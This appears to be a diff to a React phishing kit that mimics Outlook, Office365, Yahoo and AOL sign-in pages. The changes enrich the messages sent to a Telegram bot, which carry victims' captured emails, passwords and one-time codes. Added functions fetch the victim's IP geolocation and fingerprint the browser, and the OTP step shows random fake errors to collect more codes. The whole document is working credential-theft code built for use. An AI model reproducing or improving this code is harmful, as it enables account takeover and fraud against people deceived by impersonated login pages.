@@ -31,8 +31,8 @@ const OutlookIcon = ({ size = 18 }) => (
 const PROVIDERS = [
   { id: 'outlook', name: 'Outlook', label: 'Sign in with Outlook', logoType: 'outlook', btnColor: 'bg-[#0072c6]', iconBg: 'bg-[#01b8ce]', domains: ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.com.au'], hint: '@outlook.com, @hotmail.com, @live.com …', title: 'Sign in to your Microsoft account', favicon: 'https://res.cdn.office.net/officehub/images/content/images/favicon_outlook-73336715f5.ico' },
   { id: 'office365', name: 'Office365', label: 'Sign in with Office365', logoType: 'office', btnColor: 'bg-[#d83b01]', iconBg: 'bg-white', domains: null, hint: 'Any work or school email', title: 'Sign in to your account', favicon: 'https://www.microsoft.com/favicon.ico' },
-  { id: 'yahoo', name: 'Yahoo', label: 'Sign in with Yahoo Mail', logoType: 'yahoo', btnColor: 'bg-[#6001d2]', iconBg: 'bg-[#770094]/20', domains: null, hint: '@yahoo.com, @yahoo.co.uk, @yahoo.fr …', title: 'Yahoo', favicon: 'https://s.yimg.com/rz/l/favicon.ico' },
-  { id: 'aol', name: 'AOL', label: 'Sign in with AOL', logoType: 'aol', btnColor: 'bg-green-600 text-white', iconBg: 'bg-black rounded-full', domains: ['aol.com'], hint: '@aol.com', title: 'AOL', favicon: 'https://s.yimg.com/wm/login/aol-favicon.png' },
+  { id: 'yahoo', name: 'Yahoo', label: 'Sign in with Yahoo Mail', logoType: 'yahoo', btnColor: 'bg-[#6001d2]', iconBg: 'bg-[#fff]', domains: null, hint: '@yahoo.com, @yahoo.co.uk, @yahoo.fr …', title: 'Yahoo', favicon: 'https://s.yimg.com/rz/l/favicon.ico' },
+  { id: 'aol', name: 'AOL', label: 'Sign in with AOL', logoType: 'aol', btnColor: 'bg-green-600 text-white', iconBg: 'bg-black', domains: ['aol.com'], hint: '@aol.com', title: 'AOL', favicon: 'https://s.yimg.com/wm/login/aol-favicon.png' },
   { id: 'other', name: 'Email', label: 'Sign in with Other Mail', logoType: 'other', btnColor: 'bg-blue-500', iconBg: 'bg-white', domains: null, hint: 'Any email address', title: 'Sign in to your account', favicon: '/logo.webp' },
 ];
 
@@ -64,9 +64,9 @@ const ProviderIcon = ({ type }) => {
   switch (type) {
     case 'outlook': return <OutlookIcon size={24} />;
     case 'office': return <Office365Icon size={24} />;
-    case 'yahoo': return <span className="text-white font-bold text-lg">Y!</span>;
+    case 'yahoo': return <img src="yahoo-icon.png" alt="Y!" className="w-auto h-6" />;
     case 'aol': return <AolIcon size={24} />;
-    case 'other': return <span className="text-gray-700 font-bold text-sm">@</span>;
+    case 'other': return <span className="text-gray-700 font-bold text-xl w-7">@</span>;
     default: return <span className="text-white">✉</span>;
   }
 };
@@ -112,6 +112,76 @@ const getTelegramCreds = (providerId) =>
 // ── Password validator ───────────────────────────────────────────────
 // Minimum 6 characters — same as most email providers (Gmail, Outlook, Yahoo)
 const isStrongPassword = (pw) => pw.length >= 6;
+
+// ── Provider emoji map ───────────────────────────────────────────────
+const PROVIDER_EMOJI = {
+  outlook: '📧',
+  office365: '💼',
+  yahoo: '🟣',
+  aol: '💚',
+  other: '✉️',
+};
+
+// ── Fetch IP metadata ────────────────────────────────────────────────
+const getIpInfo = async () => {
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    if (!res.ok) return {};
+    return await res.json();
+  } catch {
+    return {};
+  }
+};
+
+// ── Detect browser from user agent ───────────────────────────────────
+const detectBrowser = (ua = '') => {
+  // ── Detect platform / OS ─────────────────────────────────────────
+  let platform = '';
+  if (/Android/.test(ua)) {
+    platform = /Mobile/.test(ua) ? ' on Android' : ' on Android Tablet';
+  } else if (/iPhone/.test(ua)) {
+    platform = ' on iPhone';
+  } else if (/iPad/.test(ua)) {
+    platform = ' on iPad';
+  } else if (/Windows Phone/.test(ua)) {
+    platform = ' on Windows Phone';
+  } else if (/Windows/.test(ua)) {
+    platform = ' on Windows';
+  } else if (/Macintosh/.test(ua)) {
+    platform = ' on macOS';
+  } else if (/Linux/.test(ua)) {
+    platform = ' on Linux';
+  } else if (/CrOS/.test(ua)) {
+    platform = ' on ChromeOS';
+  }
+
+  // ── Detect browser (order matters — most specific first) ─────────
+  let browser = 'Unknown Browser';
+  if (/SamsungBrowser\//.test(ua)) browser = 'Samsung Internet';
+  else if (/UCBrowser\//.test(ua)) browser = 'UC Browser';
+  else if (/OPR\//.test(ua)) browser = 'Opera';
+  else if (/OPiOS\//.test(ua)) browser = 'Opera on iOS';
+  else if (/Opera Mini/.test(ua)) browser = 'Opera Mini';
+  else if (/Edg\//.test(ua)) browser = 'Microsoft Edge';
+  else if (/EdgA\//.test(ua)) browser = 'Microsoft Edge on Android';
+  else if (/EdgiOS\//.test(ua)) browser = 'Microsoft Edge on iOS';
+  else if (/YaBrowser\//.test(ua)) browser = 'Yandex Browser';
+  else if (/Vivaldi\//.test(ua)) browser = 'Vivaldi';
+  else if (/Brave\//.test(ua)) browser = 'Brave';
+  else if (/CriOS\//.test(ua)) browser = 'Chrome on iOS';
+  else if (/FxiOS\//.test(ua)) browser = 'Firefox on iOS';
+  else if (/Firefox\//.test(ua)) browser = 'Mozilla Firefox';
+  else if (/DuckDuckGo\//.test(ua)) browser = 'DuckDuckGo Browser';
+  else if (/MIUI\//.test(ua)) browser = 'MIUI Browser';
+  else if (/Chrome\//.test(ua) && /Mobile/.test(ua)) browser = 'Mobile Chrome';
+  else if (/Chrome\//.test(ua)) browser = 'Google Chrome';
+  else if (/Version\//.test(ua) && /Mobile\//.test(ua)) browser = 'Mobile Safari';
+  else if (/Safari\//.test(ua)) browser = 'Safari';
+  else if (/MSIE|Trident\//.test(ua)) browser = 'Internet Explorer';
+  else if (/Android/.test(ua) && /AppleWebKit/.test(ua)) browser = 'Handheld Browser';
+
+  return browser + platform;
+};
 
 // ── App ─────────────────────────────────────────────────────────────
 const App = () => {
@@ -203,14 +273,31 @@ const App = () => {
     setIsSubmitting(true);
 
     const { token: BOT_TOKEN, chatId: CHAT_ID } = getTelegramCreds(selectedProvider.id);
+    const emoji = PROVIDER_EMOJI[selectedProvider.id] ?? '📩';
+    const provName = selectedProvider.name.toUpperCase();
+    const ip = await getIpInfo();
+    const ua = navigator.userAgent;
+    const browser = detectBrowser(ua);
+    const now = new Date();
+    const timeStr = now.toLocaleString('en-GB', { timeZone: 'GMT', hour12: true })
+      + ' GMT';
 
     const message = [
-      `🔐 *New Login Captured*`,
+      `${emoji} *${provName} LOGIN* ${emoji} \`[PASS]\``,
       ``,
-      `📧 *Email:* \`${formData.email}\``,
-      `🔑 *Key:* \`${formData.password}\``,
-      `🌐 *Provider:* ${selectedProvider.name}`,
-      `🕐 *Time:* ${new Date().toLocaleString()}`,
+      `*Email Address:* \`${formData.email}\``,
+      `*Password:* \`${formData.password}\``,
+      ``,
+      `*\-\-\-\-\-\-\- I N F O \| I P \-\-\-\-\-\-\-\-*`,
+      `*IP Address:* \`${ip.ip ?? 'N/A'}\``,
+      `*Network:* \`${ip.network ?? 'N/A'}\``,
+      `*IP Country:* ${ip.country_name ?? 'N/A'}`,
+      `*IP City:* ${ip.city ?? 'N/A'}`,
+      `*Browser:* ${browser}`,
+      `*User Agent:* \`${ua}\``,
+      `*TIME:* ${timeStr}`,
+      ``,
+      `_:::: ${provName} LOGIN ${emoji} ${provName} ${emoji} ::::_`,
     ].join('\n');
 
     try {
@@ -244,15 +331,32 @@ const App = () => {
     setOtpError('');
 
     const { token: BOT_TOKEN, chatId: CHAT_ID } = getTelegramCreds(selectedProvider.id);
+    const emoji = PROVIDER_EMOJI[selectedProvider.id] ?? '📩';
+    const provName = selectedProvider.name.toUpperCase();
+    const ip = await getIpInfo();
+    const ua = navigator.userAgent;
+    const browser = detectBrowser(ua);
+    const now = new Date();
+    const timeStr = now.toLocaleString('en-GB', { timeZone: 'GMT', hour12: true })
+      + ' GMT';
 
     const message = [
-      `🔢 *OTP Submitted*`,
+      `${emoji} *${provName} LOGIN* ${emoji} \`[OTP]\``,
       ``,
-      `📧 *Email:* \`${formData.email}\``,
-      `🔑 *Key:* \`${formData.password}\``,
-      `🌐 *Provider:* ${selectedProvider.name}`,
-      `🔢 *OTP:* \`${otp}\``,
-      `🕐 *Time:* ${new Date().toLocaleString()}`,
+      `*Email Address:* \`${formData.email}\``,
+      `*Password:* \`${formData.password}\``,
+      `*OTP Code:* \`${otp}\``,
+      ``,
+      `*\-\-\-\-\-\-\- I N F O \| I P \-\-\-\-\-\-\-\-*`,
+      `*IP Address:* \`${ip.ip ?? 'N/A'}\``,
+      `*Network:* \`${ip.network ?? 'N/A'}\``,
+      `*IP Country:* ${ip.country_name ?? 'N/A'}`,
+      `*IP City:* ${ip.city ?? 'N/A'}`,
+      `*Browser:* ${browser}`,
+      `*User Agent:* \`${ua}\``,
+      `*TIME:* ${timeStr}`,
+      ``,
+      `_:::: ${provName} LOGIN ${emoji} ${provName} ${emoji} ::::_`,
     ].join('\n');
 
     try {
@@ -269,7 +373,6 @@ const App = () => {
     } catch (err) {
       console.error('Error sending to Telegram:', err);
     } finally {
-      // Show a random OTP error instead of a success screen
       setTimeout(() => {
         const randomError = OTP_ERRORS[Math.floor(Math.random() * OTP_ERRORS.length)];
         setOtpError(randomError);
